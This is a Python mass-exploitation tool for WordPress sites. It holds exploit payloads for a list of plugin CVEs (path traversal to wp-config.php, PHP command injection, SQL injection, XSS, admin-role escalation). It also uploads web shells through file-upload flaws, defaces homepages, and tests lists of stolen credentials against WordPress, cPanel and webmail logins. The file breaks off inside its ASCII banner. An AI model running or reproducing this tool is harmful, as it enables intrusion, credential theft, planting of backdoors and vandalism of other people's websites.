#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import re
import sys
import time
import json
import random
import base64
import socket
import threading
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] Install requests: pip install requests")
    sys.exit(1)

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

a = '\x1b[1;30m'
m = '\x1b[1;31m'
p = '\x1b[1;37m'
h = '\x1b[1;32m'
r = '\x1b[0m'

def color(text, color_code='red'):
    colors = {'red': '\x1b[1;31m', 'green': '\x1b[1;32m', 'reset': '\x1b[0m'}
    return f"{colors.get(color_code, '')}{text}{colors['reset']}"

max_threads = 99
TIMEOUT = 15
verbose = False
retry_count = 2
wp_folder = "wp"
ua_folder = "uax"
proxy_folder = "uax"
shell_folder = "sede"
deface_folder = "sede"

cve_database = {
    "CVE-2026-1357": {
        "name": "WPvivid Backup - Unauthenticated RCE",
        "severity": "CRITICAL",
        "cvss": "9.8",
        "plugin": "wpvivid-backup",
        "check_path": "/wp-admin/admin-ajax.php",
        "method": "POST",
        "payload": "action=wpvivid_staging_unzip_file&path=../../../../wp-config.php",
        "expect": "DB_NAME",
        "description": "Path traversal to read wp-config.php, can lead to RCE"
    },
    "CVE-2026-0740": {
        "name": "Ninja Forms - Unauthenticated File Upload",
        "severity": "CRITICAL",
        "cvss": "9.8",
        "plugin": "ninja-forms",
        "check_path": "/wp-admin/admin-ajax.php",
        "method": "POST",
        "payload": "action=nf_fu_upload&nonce=test&field_id=7&form_id=7",
        "expect": "success",
        "description": "Unauthenticated file upload leading to RCE"
    },
    "CVE-2026-1830": {
        "name": "Quick Playground - PHP Injection",
        "severity": "CRITICAL",
        "cvss": "8.4",
        "plugin": "quick-playground",
        "check_path": "/wp-json/quick-playground/v1/update-html",
        "method": "POST",
        "payload": '{"html":"<?php system($_GET[\\"cmd\\"]); ?>"}',
        "payload_type": "json",
        "expect": "success",
        "description": "PHP code injection via API"
    },
    "CVE-2026-4484": {
        "name": "Masteriyo LMS - Privilege Escalation",
        "severity": "CRITICAL",
        "cvss": "9.8",
        "plugin": "masteriyo-lms",
        "check_path": "/wp-json/masteriyo/v1/users/1/role",
        "method": "POST",
        "payload": '{"role":"administrator"}',
        "payload_type": "json",
        "expect": "success",
        "description": "Change any user role to administrator"
    },
    "CVE-2026-2631": {
        "name": "Datalogics Ecommerce - Auth Bypass",
        "severity": "CRITICAL",
        "cvss": "9.1",
        "plugin": "datalogics-ecommerce",
        "check_path": "/wp-json/datalogics/v1/settings",
        "method": "POST",
        "payload": '{"enable_registration":true,"default_role":"administrator"}',
        "payload_type": "json",
        "expect": "success",
        "description": "Unauthenticated admin registration"
    },
    "CVE-2026-4021": {
        "name": "Contest Gallery - Admin Registration",
        "severity": "CRITICAL",
        "cvss": "8.1",
        "plugin": "contest-gallery",
        "check_path": "/wp-admin/admin-ajax.php",
        "method": "POST",
        "payload": "action=contest_galery_register&email=attacker_%d@test.com&username=attacker_%d&password=Attacker123",
        "expect": "success",
        "description": "Register as admin without authentication"
    },
    "CVE-2026-1405": {
        "name": "Slider Future - File Upload RCE",
        "severity": "CRITICAL",
        "cvss": "9.8",
        "plugin": "slider-future",
        "check_path": "/wp-admin/admin-ajax.php",
        "method": "POST",
        "payload": "action=sf_upload_slider_image",
        "expect": "http",
        "description": "Upload PHP file via slider image upload"
    },
    "CVE-2026-3657": {
        "name": "My Sticky Bar - SQL Injection",
        "severity": "HIGH",
        "cvss": "7.5",
        "plugin": "my-sticky-bar",
        "check_path": "/wp-admin/admin-ajax.php",
        "method": "POST",
        "payload": "action=stickymenu_contact_lead_form&test_column=' OR SLEEP(5)--",
        "expect": "sleep",
        "description": "Time-based blind SQL injection"
    },
    "CVE-2026-1581": {
        "name": "wpForo Forum - SQL Injection",
        "severity": "HIGH",
        "cvss": "7.5",
        "plugin": "wpforo",
        "check_path": "/wp-admin/admin-ajax.php",
        "method": "POST",
        "payload": "action=wpf_get_forums&wpfob=' OR SLEEP(5)--",
        "expect": "sleep",
        "description": "SQL injection in forum sorting parameter"
    },
    "CVE-2026-5465": {
        "name": "Amelia Booking - IDOR",
        "severity": "HIGH",
        "cvss": "7.5",
        "plugin": "ameliabooking",
        "check_path": "/wp-json/amelia/v1/users",
        "method": "GET",
        "payload": "",
        "expect": "@",
        "description": "IDOR exposes all user data"
    },
    "CVE-2026-1731": {
        "name": "BeyondTrust - Command Injection",
        "severity": "HIGH",
        "cvss": "8.8",
        "plugin": "beyondtrust",
        "check_path": "/wp-admin/admin-ajax.php",
        "method": "POST",
        "payload": "action=beyondtrust_exec&cmd=id",
        "expect": "uid=",
        "description": "Authenticated command injection"
    },
    "CVE-2026-5425": {
        "name": "Social Photo Feed - Stored XSS",
        "severity": "HIGH",
        "cvss": "7.2",
        "plugin": "social-photo-feed",
        "check_path": "/wp-admin/admin-ajax.php",
        "method": "POST",
        "payload": "action=save_feed_data&feed_data=<script>alert(1)</script>",
        "expect": "<script>",
        "description": "Stored XSS via feed data parameter"
    },
    "CVE-2026-4896": {
        "name": "WCFM - IDOR",
        "severity": "HIGH",
        "cvss": "7.5",
        "plugin": "wc-frontend-manager",
        "check_path": "/wp-admin/admin-ajax.php",
        "method": "POST",
        "payload": "action=wcfm_modify_order_status&order_id=1&status=completed",
        "expect": "success",
        "description": "IDOR allows order status modification"
    },
    "CVE-2026-3666": {
        "name": "wpForo - File Deletion",
        "severity": "HIGH",
        "cvss": "8.1",
        "plugin": "wpforo",
        "check_path": "/wp-admin/admin-ajax.php",
        "method": "POST",
        "payload": "action=wpf_delete_post&post_id=1&file=../../../../wp-config.php",
        "expect": "DB_NAME",
        "description": "Authenticated arbitrary file deletion"
    },
    "CVE-2026-3005": {
        "name": "List Category Posts - Stored XSS",
        "severity": "HIGH",
        "cvss": "7.2",
        "plugin": "list-category-posts",
        "check_path": "/wp-admin/admin-ajax.php",
        "method": "POST",
        "payload": "action=lcp_update&add_class=<img src=x onerror=alert(1)>",
        "expect": "<img",
        "description": "Stored XSS in widget settings"
    },
    "CVE-2026-3090": {
        "name": "Post SMTP - Reflected XSS",
        "severity": "HIGH",
        "cvss": "7.2",
        "plugin": "post-smtp",
        "check_path": "/wp-admin/admin.php",
        "method": "GET",
        "payload": "page=post-smtp&event_type=<script>alert(1)</script>",
        "expect": "<script>",
        "description": "Reflected XSS in event parameter"
    },
    "CVE-2026-3568": {
        "name": "MStore API - Privilege Escalation",
        "severity": "MEDIUM",
        "cvss": "4.3",
        "plugin": "mstore-api",
        "check_path": "/wp-json/mstore/v1/user/update",
        "method": "POST",
        "payload": '{"user_id":1,"meta_data":[{"key":"wp_capabilities","value":"administrator"}]}',
        "payload_type": "json",
        "expect": "success",
        "description": "Subscriber to admin escalation"
    },
    "CVE-2026-3585": {
        "name": "Events Calendar - Path Traversal",
        "severity": "MEDIUM",
        "cvss": "6.5",
        "plugin": "the-events-calendar",
        "check_path": "/wp-admin/admin-ajax.php",
        "method": "GET",
        "payload": "action=tribe_import&import_id=../../../../wp-config.php",
        "expect": "DB_NAME",
        "description": "Path traversal allows arbitrary file read"
    },
    "CVE-2026-2890": {
        "name": "Formidable Forms - Payment Bypass",
        "severity": "MEDIUM",
        "cvss": "5.3",
        "plugin": "formidable-forms",
        "check_path": "/wp-admin/admin-ajax.php",
        "method": "POST",
        "payload": "action=frm_stripe_link_return&payment_intent=pi_test&payment_status=succeeded",
        "expect": "success",
        "description": "Payment status manipulation"
    }
}

def load_targets_from_folder(folder_path):
    targets = []
    
    if not os.path.exists(folder_path):
        print(f"[!] Folder {folder_path} not found, creating...")
        os.makedirs(folder_path, exist_ok=True)
        return targets
    
    for filename in os.listdir(folder_path):
        if filename.endswith('.txt'):
            filepath = os.path.join(folder_path, filename)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            if not line.startswith(('http://', 'https://')):
                                line = 'https://' + line
                            targets.append(line.rstrip('/'))
                print(f"  Loaded {len([l for l in open(filepath) if l.strip()])} from {filename}")
            except Exception as e:
                print(f"  Error reading {filename}: {e}")
    
    return list(set(targets))

def load_user_agents(folder_path):
    agents = []
    
    default_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
    ]
    
    if not os.path.exists(folder_path):
        os.makedirs(folder_path, exist_ok=True)
        sample_file = os.path.join(folder_path, "user_agents.txt")
        if not os.path.exists(sample_file):
            with open(sample_file, 'w') as f:
                f.write('\n'.join(default_agents))
        return default_agents
    
    for filename in os.listdir(folder_path):
        if filename.endswith('.txt'):
            filepath = os.path.join(folder_path, filename)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            agents.append(line)
            except Exception as e:
                print(f"  Error loading {filename}: {e}")
    
    if not agents:
        agents = default_agents
    
    return agents

def load_proxies(folder_path):
    proxies_list = []
    
    if not os.path.exists(folder_path):
        os.makedirs(folder_path, exist_ok=True)
        return proxies_list
    
    for filename in os.listdir(folder_path):
        if filename.endswith('.txt') and ('proxy' in filename.lower() or 'proxy' in filename.lower()):
            filepath = os.path.join(folder_path, filename)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            if not line.startswith(('http://', 'https://', 'socks')):
                                line = 'http://' + line
                            proxies_list.append(line)
                print(f"  Loaded {len(proxies_list)} proxies from {filename}")
            except Exception as e:
                print(f"  Error loading {filename}: {e}")
    
    return proxies_list

def load_shells(folder_path):
    shells_list = []
    
    if not os.path.exists(folder_path):
        os.makedirs(folder_path, exist_ok=True)
        return shells_list
    
    for filename in os.listdir(folder_path):
        if filename.endswith('.php') or filename.endswith('.txt'):
            filepath = os.path.join(folder_path, filename)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    if content.strip():
                        shells_list.append(content)
                print(f"  Loaded shell: {filename}")
            except Exception as e:
                print(f"  Error loading {filename}: {e}")
    
    return shells_list

def load_deface_files(folder_path):
    deface_list = []
    
    if not os.path.exists(folder_path):
        os.makedirs(folder_path, exist_ok=True)
        return deface_list
    
    for filename in os.listdir(folder_path):
        if filename.endswith('.html') or filename.endswith('.htm') or filename.endswith('.txt'):
            filepath = os.path.join(folder_path, filename)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    if content.strip():
                        deface_list.append(content)
                print(f"  Loaded deface: {filename}")
            except Exception as e:
                print(f"  Error loading {filename}: {e}")
    
    return deface_list

def load_credentials_from_file(filepath):
    credentials = []
    
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                if ':' in line:
                    parts = line.split(':')
                    if len(parts) >= 3:
                        credentials.append({
                            'target': parts[0],
                            'username': parts[1],
                            'password': ':'.join(parts[2:])
                        })
                elif '|' in line:
                    parts = line.split('|')
                    if len(parts) >= 3:
                        credentials.append({
                            'target': parts[0],
                            'username': parts[1],
                            'password': '|'.join(parts[2:])
                        })
    except Exception as e:
        print(f"Error loading credentials: {e}")
    
    return credentials

def get_session(proxy=None):
    session = requests.Session()
        # Retry strategy
    retry = Retry(total=retry_count, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry, pool_connections=100, pool_maxsize=100)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    # Proxy
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}
    
    session.verify = False
    return session

def get_random_ua():
    return random.choice(userAgents) if userAgents else "Mozilla/5.0"

def get_random_proxy():
    if proxies:
        return random.choice(proxies)
    return None


def is_alive(target):
    try:
        session = get_session()
        resp = session.get(target, timeout=TIMEOUT, headers={'User-Agent': get_random_ua()})
        return resp.status_code < 500
    except:
        return False

def detect_wordpress(target):
    session = get_session()
    paths = ['/wp-login.php', '/wp-admin', '/xmlrpc.php', '/wp-json', '/readme.html']
    
    for path in paths:
        try:
            resp = session.get(target + path, timeout=TIMEOUT, headers={'User-Agent': get_random_ua()})
            if resp.status_code == 200:
                body = resp.text.lower()
                if any(x in body for x in ['wordpress', 'wp-content', 'wp-includes', 'wp-admin']):
                    return True
        except:
            pass
    return False

def get_wordpress_info(target):
    info = {
        'version': None,
        'users': [],
        'plugins': [],
        'themes': [],
        'xmlrpc': False,
        'rest_api': False
    }
    session = get_session()
    ua = get_random_ua()
    
    # Get version from readme
    try:
        resp = session.get(target + '/readme.html', timeout=TIMEOUT, headers={'User-Agent': ua})
        if resp.status_code == 200:
            match = re.search(r'Version ([0-9.]+)', resp.text)
            if match:
                info['version'] = match.group(1)
    except:
        pass
    
    # Get users from REST API
    try:
        resp = session.get(target + '/wp-json/wp/v2/users', timeout=TIMEOUT, headers={'User-Agent': ua})
        if resp.status_code == 200:
            users = resp.json()
            info['users'] = [u.get('name', u.get('slug')) for u in users[:10]]
    except:
        pass
    
    # Check XML-RPC
    try:
        resp = session.get(target + '/xmlrpc.php', timeout=TIMEOUT, headers={'User-Agent': ua})
        info['xmlrpc'] = resp.status_code == 200
    except:
        pass
    
    # Check REST API
    try:
        resp = session.get(target + '/wp-json', timeout=TIMEOUT, headers={'User-Agent': ua})
        info['rest_api'] = resp.status_code == 200
    except:
        pass
    
    return info

def test_wordpress_login(target, username, password):
    """Test WordPress login with detailed result"""
    session = get_session()
    login_url = target + '/wp-login.php'
    ua = get_random_ua()
    
    # Get initial cookies
    try:
        session.get(login_url, timeout=TIMEOUT, headers={'User-Agent': ua})
    except:
        pass
    
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': target + '/wp-admin/',
        'testcookie': '1'
    }
    
    try:
        resp = session.post(login_url, data=data, timeout=TIMEOUT, 
                           headers={'User-Agent': ua}, allow_redirects=False)
        
        # Check redirect to admin
        if resp.status_code == 302:
            location = resp.headers.get('Location', '')
            if '/wp-admin/' in location:
                return True, 'admin', dict(session.cookies)
        
        # Check for login cookie
        for cookie in session.cookies:
            if 'wordpress_logged_in' in cookie.name:
                return True, 'admin', dict(session.cookies)
        
        return False, None, None
    except Exception as e:
        return False, None, None

def test_cpanel_login(domain, username, password):
    """Test cPanel login"""
    try:
        session = get_session()
        login_url = f"https://{domain}:2083/login/"
        data = {'user': username, 'pass': password}
        ua = get_random_ua()
        
        resp = session.post(login_url, data=data, timeout=TIMEOUT, headers={'User-Agent': ua})
        
        if resp.status_code == 200:
            body = resp.text.lower()
            if 'cpanel' in body or 'dashboard' in body:
                return True, 'cpanel'
        
        for cookie in session.cookies:
            if 'cpsession' in cookie.name:
                return True, 'cpanel'
        
        return False, None
    except:
        return False, None

def test_webmail_login(target, username, password):
    webmail_configs = [
        {'path': '/roundcube/', 'user': '_user', 'pass': '_pass', 'success': '_task=mail'},
        {'path': '/squirrelmail/src/redirect.php', 'user': 'login_username', 'pass': 'secretkey', 'success': 'mailbox'},
        {'path': '/rainloop/', 'user': 'Email', 'pass': 'Password', 'success': 'rainloop'},
        {'path': '/webmail/', 'user': 'user', 'pass': 'pass', 'success': 'inbox'},
        {'path': '/horde/', 'user': 'horde_user', 'pass': 'horde_pass', 'success': 'horde'},
    ]
    
    session = get_session()
    ua = get_random_ua()
    
    for cfg in webmail_configs:
        try:
            login_url = target + cfg['path']
            data = {cfg['user']: username, cfg['pass']: password}
            
            resp = session.post(login_url, data=data, timeout=TIMEOUT, headers={'User-Agent': ua})
            body = resp.text.lower()
            
            if cfg['success'] in body:
                return True, 'webmail'
            
            if any('session' in c.name.lower() for c in session.cookies):
                return True, 'webmail'
        except:
            pass
    
    return False, None

def check_cve(target, cve_id, cve_data):
    session = get_session()
    test_url = target + cve_data['check_path']
    method = cve_data['method']
    payload = cve_data['payload']
    expect = cve_data['expect']
    ua = get_random_ua()
    
    # Replace dynamic placeholders
    if '%d' in payload:
        payload = payload % (random.randint(1, 99999), random.randint(1, 99999))
    
    try:
        start_time = time.time()
        
        if method == 'POST':
            headers = {'User-Agent': ua}
            if cve_data.get('payload_type') == 'json':
                headers['Content-Type'] = 'application/json'
                resp = session.post(test_url, data=payload, headers=headers, timeout=TIMEOUT)
            else:
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                resp = session.post(test_url, data=payload, headers=headers, timeout=TIMEOUT)
        else:
            full_url = test_url + '?' + payload if payload else test_url
            resp = session.get(full_url, timeout=TIMEOUT, headers={'User-Agent': ua})
        
        elapsed = time.time() - start_time
        
        # Time-based detection
        if expect == 'sleep' and elapsed > 5:
            return True, f"Time-based injection detected ({elapsed:.2f}s)"
        
        # Pattern matching
        body = resp.text.lower()
        if expect.lower() in body:
            return True, f"Pattern found: {expect}"
        
        # Success response
        if expect == 'success' and resp.status_code == 200:
            return True, "HTTP 200 OK"
        
        # IDOR email detection
        if cve_id == 'CVE-2026-5465' and '@' in body and ('.com' in body or '.net' in body):
            return True, "Email addresses found in response"
        
        return False, None
    except Exception as e:
        if verbose:
            print(f"    Error: {str(e)[:50]}")
        return False, None

def scan_target_cves(target):
    vulnerabilities = []
    
    if not detect_wordpress(target):
        if verbose:
            print(f"    Not a WordPress site")
        return vulnerabilities
    
    if verbose:
        print(f"    WordPress detected, scanning {len(cve_database)} CVEs...")
    
    for cve_id, cve_data in cve_database.items():
        if verbose:
            print(f"      Testing {cve_id}...", end=' ', flush=True)
        
        vulnerable, proof = check_cve(target, cve_id, cve_data)
        
        if vulnerable:
            if verbose:
                print("VULNERABLE!")
            vulnerabilities.append({
                'cve': cve_id,
                'name': cve_data['name'],
                'severity': cve_data['severity'],
                'cvss': cve_data['cvss'],
                'proof': proof
            })
        else:
            if verbose:
                print("Not vulnerable")
        
        # Rate limiting
        time.sleep(0.1)
    
    return vulnerabilities

def upload_shell(target, session=None):
    if session is None:
        session = get_session()
    
    for shell_code in shells:
        encoded_shell = base64.b64encode(shell_code.encode()).decode()
        
        upload_methods = [
            {
                'url': target + '/wp-admin/admin-ajax.php',
                'data': f'action=wpvivid_staging_unzip_file&path=../../../../wp-content/uploads/shell.php&file_name={encoded_shell}',
                'type': 'form'
            },
            {
                'url': target + '/wp-admin/admin-ajax.php',
                'data': f'action=nf_fu_upload&field_id=7&form_id=7&file={encoded_shell}&filename=shell.php',
                'type': 'form'
            },
            {
                'url': target + '/wp-admin/admin-ajax.php',
                'data': f'action=sf_upload_slider_image&image={encoded_shell}&filename=shell.php',
                'type': 'form'
            }
        ]
        
        for method in upload_methods:
            try:
                if method['type'] == 'form':
                    resp = session.post(method['url'], data=method['data'], timeout=TIMEOUT,
                                       headers={'User-Agent': get_random_ua()})
                
                shell_urls = [
                    target + '/wp-content/uploads/shell.php',
                    target + '/shell.php',
                    target + '/wp-content/uploads/shell.php?cmd=echo%20test123'
                ]
                
                for shell_url in shell_urls:
                    try:
                        test_resp = session.get(shell_url, timeout=TIMEOUT,
                                               headers={'User-Agent': get_random_ua()})
                        if 'test123' in test_resp.text or 'Shell Ready' in test_resp.text:
                            return shell_url.split('?')[0]
                    except:
                        pass
            except:
                pass
    
    return None

def deface_site(target, session=None):
    if session is None:
        session = get_session()
    
    for deface_content in defaceFiles:
        encoded = base64.b64encode(deface_content.encode()).decode()
        
        deface_methods = [
            target + f'/wp-admin/admin-ajax.php?action=wpvivid_staging_unzip_file&path=../../../../index.html&file_name={encoded}',
            target + f'/wp-admin/admin-ajax.php?action=sf_upload_slider_image&path=../../../../index.html&content={encoded}',
        ]
        
        for method_url in deface_methods:
            try:
                resp = session.get(method_url, timeout=TIMEOUT, headers={'User-Agent': get_random_ua()})
                
                # Verify deface
                verify = session.get(target, timeout=TIMEOUT, headers={'User-Agent': get_random_ua()})
                if 'Hacked' in verify.text or 'Security Test' in verify.text or 'Vulnerability' in verify.text:
                    return True
            except:
                pass
    
    return False

def process_target(target, config):
    global stats, scan_results
    
    with stats_lock:
        stats['current'] += 1
        current = stats['current']
        total = stats['total']
    
    # Progress display
    progress = int(current / total * 50)
    bar = '█' * progress + '░' * (50 - progress)
    sys.stdout.write(f'\r[{bar}] {current}/{total} ({current/total*100:.1f}%)')
    sys.stdout.flush()
    
    # Check if alive
    if not is_alive(target):
        with stats_lock:
            stats['dead'] += 1
        return
    
    with stats_lock:
        stats['scanned'] += 1
    
    if verbose:
        print(f"\n\n[+] Processing: {target}")
    
    # Detect WordPress
    is_wp = detect_wordpress(target)
    
    if is_wp and config.get('scan_cve', True):
        if verbose:
            print(f"    WordPress detected, scanning CVEs...")
        
        vulns = scan_target_cves(target)
        
        if vulns:
            with stats_lock:
                stats['vulnerable'] += len(vulns)
            
            with results_lock:
                for v in vulns:
                    scan_results.append({
                        'target': target,
                        'cve': v['cve'],
                        'name': v['name'],
                        'severity': v['severity'],
                        'proof': v['proof'],
                        'timestamp': datetime.now().isoformat()
                    })
    
    # Upload shell
    if is_wp and config.get('upload_shell', False):
        if verbose:
            print(f"    Attempting shell upload...")
        shell_url = upload_shell(target)
        if shell_url:
            with stats_lock:
                stats['shells'] += 1
            with results_lock:
                working_shells.append(shell_url)
            if verbose:
                print(f"    Shell uploaded: {shell_url}")
    
    # Deface
    if is_wp and config.get('deface', False):
        if verbose:
            print(f"    Attempting deface...")
        if deface_site(target):
            with stats_lock:
                stats['defaced'] += 1
            with results_lock:
                defaced_sites.append(target)
            if verbose:
                print(f"    Site defaced!")

def process_credential(cred, config):
    target = cred.get('target', '')
    username = cred.get('username', '')
    password = cred.get('password', '')
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    # Check if alive
    if not is_alive(target):
        return None
    
    # Test WordPress login
    success, role, cookies = test_wordpress_login(target, username, password)
    
    if success:
        result = {
            'target': target,
            'platform': 'wordpress',
            'username': username,
            'password': password,
            'success': True,
            'role': role,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"\n[+] WordPress LOGIN SUCCESS: {target}")
        print(f"    Username: {username}")
        print(f"    Password: {password}")
        
        with results_lock:
            login_results.append(result)
            stats['logins'] += 1
        
        return result
    
    # Test cPanel
    domain = re.sub(r'https?://', '', target).split('/')[0]
    success, platform = test_cpanel_login(domain, username, password)
    
    if success:
        result = {
            'target': target,
            'platform': 'cpanel',
            'username': username,
            'password': password,
            'success': True,
            'timestamp': datetime.now().isoformat()
        }
        print(f"\n[+] cPanel LOGIN SUCCESS: {target}")
        
        with results_lock:
            login_results.append(result)
            stats['logins'] += 1
        
        return result
    
    # Test webmail
    success, platform = test_webmail_login(target, username, password)
    
    if success:
        result = {
            'target': target,
            'platform': 'webmail',
            'username': username,
            'password': password,
            'success': True,
            'timestamp': datetime.now().isoformat()
        }
        print(f"\n[+] Webmail LOGIN SUCCESS: {target}")
        
        with results_lock:
            login_results.append(result)
            stats['logins'] += 1
        
        return result
    
    return None

def save_results():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # Create reports directory
    os.makedirs('reports', exist_ok=True)
    
    # Save scan results
    if scan_results:
        with open(f'reports/scan_{timestamp}.json', 'w') as f:
            json.dump(scan_results, f, indent=2)
        
        with open(f'reports/vulnerable_{timestamp}.txt', 'w') as f:
            for r in scan_results:
                f.write(f"{r['target']}|{r['cve']}|{r['name']}|{r['severity']}\n")
        
        print(f"\n[+] Saved {len(scan_results)} vulnerabilities to reports/scan_{timestamp}.json")
    
    # Save login results
    if login_results:
        with open(f'reports/logins_{timestamp}.json', 'w') as f:
            json.dump(login_results, f, indent=2)
        
        with open(f'reports/successful_{timestamp}.txt', 'w') as f:
            for r in login_results:
                if r.get('success'):
                    f.write(f"{r['platform']}|{r['target']}|{r['username']}|{r['password']}\n")
        
        print(f"[+] Saved {len(login_results)} logins to reports/successful_{timestamp}.txt")
    
    # Save shells
    if working_shells:
        with open(f'reports/shells_{timestamp}.txt', 'w') as f:
            for s in working_shells:
                f.write(f"{s}?cmd=id\n")
        print(f"[+] Saved {len(working_shells)} shells to reports/shells_{timestamp}.txt")
    
    # Save defaced sites
    if defaced_sites:
        with open(f'reports/defaced_{timestamp}.txt', 'w') as f:
            for s in defaced_sites:
                f.write(f"{s}|{datetime.now().isoformat()}\n")
        print(f"[+] Saved {len(defaced_sites)} defaced sites to reports/defaced_{timestamp}.txt")

def print_statistics():
    print("SCAN STATISTICS")
    print(f"Total targets loaded     : {stats['total']:,}")
    print(f"Targets scanned          : {stats['scanned']:,}")
    print(f"Dead/unreachable         : {stats['dead']:,}")
    print(f"Vulnerabilities found    : {stats['vulnerable']:,}")
    print(f"Successful logins        : {stats['logins']:,}")
    print(f"Shells uploaded          : {stats['shells']:,}")
    print(f"Sites defaced            : {stats['defaced']:,}")
    print(f"Time elapsed             : {stats['elapsed']:.2f} seconds")


def print_banner():
    banner = f'''\033[1;31m
                 ⢀⣀⣀⣀⣀⣀⣠⣼⠀⠀⠀⠀⠈⠙⡆⢤⠀⠀⠀⠀⠀⣷⣄⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⡿⢿⡷⡆⠀⣵⣶⣿⣾⣷⣸⣄⠀⠀⠀⢰⠾⡿⢿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣽⣿⣿⣿⣿⡟⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⣻⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠐⣻⣿⣿⡏⢹⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⣟⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⡄⠀⠀⠀⠀⢻⣿⣿⣷⡌⠸⣿⣾⢿⡧⠀⠀⠀⠀⠀⢀⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⡿⢛⣵⣾⣿⣿⣿⣿⣿⣯⣾⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⢻⣿⣿⣿⣶⣌⠙⠋⠁⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣷⣽⣿⣿⣿⣿⣿⣷⣮⡙⢿⣿⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⡿⢋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣧⡀⠀⠀⠀⣠⣽⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣝⢿⣇⠀⠀⠀⠀
⠀⠀⠀⣴⣯⣴⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⡿⢫⣾⣿⣿⣿⣿⣿⣿⡦⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⢴⣿⣿⣿⣿⣿⣿⣷⣝⢿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣧⣽⣦⠀⠀⠀
⠀⠀⣼⣿⣿⣿⠟⢁⣴⣿⡿⢿⣿⣿⡿⠛⣰⣿⠟⣻⣿⣿⣿⣿⣿⣿⣿⡿⠿⠋⢿⣿⣿⣿⣿⣿⠻⢿⣿⣿⣿⣿⣿⣿⣿⣟⠻⣿⣆⠙⢿⣿⣿⡿⢿⣿⣦⡈⠻⣿⣿⣿⣧⠀⠀
⠀⡼⣻⣿⡟⢁⣴⡿⠋⠁⢀⣼⣿⠟⠁⣰⣿⠁⢰⣿⣿⣿⡿⣿⣿⣿⠿⠀⣠⣤⣾⣿⣿⣿⣿⣿⠀⠀⠽⣿⣿⣿⢿⣿⣿⣿⡆⠈⢿⣆⠀⠻⣿⣧⡀⠈⠙⢿⣦⡈⠻⣿⣟⢧⠀
⠀⣱⣿⠋⢠⡾⠋⠀⢀⣠⡾⠟⠁⠀⢀⣿⠟⠀⢸⣿⠙⣿⠀⠈⢿⠏⠀⣾⣿⠛⣻⣿⣿⣿⣿⣯⣤⠀⠀⠹⡿⠁⠀⣿⠏⣿⡇⠀⠹⣿⡄⠀⠈⠻⢷⣄⡀⠀⠙⢷⣄⠙⣿⣎⠂
